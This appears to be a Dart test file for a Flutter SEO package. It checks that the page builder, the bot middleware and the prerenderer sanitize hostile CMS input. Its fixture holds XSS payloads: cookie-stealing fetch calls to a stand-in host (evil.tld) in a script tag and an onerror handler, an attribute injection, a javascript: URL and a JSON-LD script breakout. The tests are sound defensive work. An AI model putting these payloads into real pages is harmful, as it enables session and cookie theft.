import 'dart:io';

import 'package:esen_seo/server.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:shelf/shelf.dart';

/// The safety net has to hold on **every** path to HTML, not just the
/// Flutter one. These tests feed hostile node trees through the three
/// server paths — `SeoPage`, the bot middleware and the prerenderer —
/// the way a CMS would, and pin that nothing executable comes out.
const _template = '''
<!DOCTYPE html>
<html>
<head><title>example</title></head>
<body>
  <script src="flutter_bootstrap.js" async></script>
</body>
</html>
''';

/// A route body as an attacker-fed CMS would produce it.
List<SeoNode> _hostileBody() => [
      SeoNode(tag: 'script', text: "fetch('//evil.tld/?c='+document.cookie)"),
      SeoNode(tag: 'img', attributes: {
        'src': 'x',
        'onerror': "fetch('//evil.tld/?c='+document.cookie)",
      }),
      SeoNode(
        tag: 'p',
        text: 'Text',
        attributes: {'x" onmouseover="alert(1)': 'y'},
      ),
      SeoNode(
        tag: 'a',
        text: 'Klick',
        attributes: {'href': 'javascript:alert(1)'},
      ),
      SeoNode(
        tag: 'script',
        attributes: {'type': 'application/ld+json'},
        rawText: '{}</script><script>alert(1)</script>',
      ),
    ];

/// Removes the blocks that are allowed to contain arbitrary text, so
/// what remains can be checked for executable markup.
///
/// Text *inside* a properly closed JSON-LD block cannot run — the point
/// of the check is that no attacker string ever becomes markup.
String _executablePart(String html) => html
    .replaceAll(
      RegExp(r'<script type="application/ld\+json">.*?</script>', dotAll: true),
      '',
    )
    .replaceAll(
        RegExp(r'<script src="flutter_bootstrap\.js"[^>]*></script>'), '');

void _expectHarmless(String html, String where) {
  final rest = _executablePart(html);
  expect(rest, isNot(contains('<script')), reason: '$where: script element');
  expect(rest, isNot(contains('onerror')), reason: '$where: onerror handler');
  expect(rest, isNot(contains('onmouseover')), reason: '$where: handler');
  expect(rest, isNot(contains('javascript:')), reason: '$where: script URL');
  // Der eingeschleuste JSON-LD-Ausbruch darf kein zweites Element öffnen:
  expect(
    html,
    isNot(contains('}</script>')),
    reason: '$where: JSON-LD breakout',
  );
}

void main() {
  group('SeoPage.fromNodes', () {
    test('neutralizes a hostile body', () {
      final html = SeoPage.fromNodes(
        meta: const SeoMeta(title: 'Titel'),
        body: _hostileBody(),
      ).toHtmlDocument();
      _expectHarmless(html, 'SeoPage');
      // Der Inhalt bleibt erhalten, nur entschärft:
      expect(html, contains('Text'));
      expect(html, contains('Klick'));
    });
  });

  group('seoBotMiddleware', () {
    test('serves bots sanitized HTML', () async {
      final handler = const Pipeline()
          .addMiddleware(seoBotMiddleware(
            routes: [
              SeoRoute(
                path: '/',
                meta: (_) => const SeoMeta(title: 'Titel'),
                body: (_) => _hostileBody(),
              ),
            ],
            siteBase: 'https://x.dev',
          ))
          .addHandler((_) => Response.ok('app'));

      final response = await handler(Request(
        'GET',
        Uri.parse('http://localhost/'),
        headers: {'user-agent': 'Googlebot/2.1'},
      ));
      _expectHarmless(await response.readAsString(), 'middleware');
    });
  });

  group('prerenderSite', () {
    late Directory buildDir;

    setUp(() async {
      buildDir = await Directory.systemTemp.createTemp('esen_seo_sanitize');
      File('${buildDir.path}/index.html').writeAsStringSync(_template);
    });

    tearDown(() => buildDir.delete(recursive: true));

    test('bakes no executable markup into the static files', () async {
      await prerenderSite(
        routes: [
          SeoRoute(
            path: '/',
            meta: (_) => const SeoMeta(title: 'Titel'),
            body: (_) => _hostileBody(),
          ),
        ],
        siteBase: 'https://x.dev',
        buildDir: buildDir.path,
      );
      final html = File('${buildDir.path}/index.html').readAsStringSync();
      // Das Flutter-Bootstrap-Script gehört zum Template und bleibt;
      // geprüft wird, dass nichts Eingeschleustes zu Markup wurde.
      _expectHarmless(html, 'prerender');
      // Der Text des geblockten script-Knotens überlebt als Text —
      // sichtbar, aber nicht ausführbar:
      expect(html, contains('<div>fetch('));
    });
  });

  group('legitimate output still works', () {
    test('JSON-LD keeps its content', () {
      final html = SeoPage.fromNodes(
        meta: SeoMeta(
          title: 'Titel',
          schemas: [SeoSchema.organization(name: 'Esen Software')],
        ),
        body: [SeoNode(tag: 'h1', text: 'Hallo')],
      ).toHtmlDocument();
      expect(html, contains('<script type="application/ld+json">'));
      expect(html, contains('"name":"Esen Software"'));
      expect(html, contains('<h1>Hallo</h1>'));
      expect(html, contains('<title>Titel</title>'));
    });

    test('ordinary links and images survive', () {
      final html = const HtmlRenderer().render([
        SeoNode(tag: 'a', text: 'Docs', attributes: {'href': '/docs'}),
        SeoNode(
          tag: 'img',
          attributes: {'src': 'https://x.dev/a.png', 'alt': 'A'},
        ),
      ]);
      expect(
        html,
        '<a href="/docs">Docs</a><img src="https://x.dev/a.png" alt="A"/>',
      );
    });
  });
}
